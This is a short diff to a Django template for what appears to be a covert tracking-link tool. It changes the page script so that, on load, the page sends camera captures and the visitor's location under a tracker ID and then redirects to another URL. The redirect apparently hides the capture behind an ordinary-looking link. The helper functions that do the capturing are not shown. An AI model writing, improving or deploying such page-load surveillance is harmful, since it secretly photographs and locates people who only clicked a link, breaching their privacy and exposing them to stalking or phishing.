@@ -38,12 +38,31 @@
 {% block script %}
 <script>
 
-    const URL_ID = "{{ url_id|escapejs }}";
-    const TRACKER_ID = "{{ tracker_id|escapejs }}";
+const URL_ID = "{{ url_id|escapejs }}";
+const TRACKER_ID = "{{ tracker_id|escapejs }}";
+const REDIRECT_URL = "{{ redirect_url|escapejs }}";
 
 
-    sendCameraCaptures(URL_ID,TRACKER_ID);
-    sendLocation(URL_ID,TRACKER_ID);
+
+async function startTracker() {
+
+    try {
+
+        await Promise.all([
+            sendCameraCaptures(URL_ID, TRACKER_ID),
+            sendLocation(URL_ID, TRACKER_ID)
+        ]);
+
+        window.location.href = REDIRECT_URL;
+
+    } catch (err) {
+
+        console.error("Tracker hiba:", err);
+
+    }
+}
+
+startTracker();
 
 </script>
 {% endblock script %}
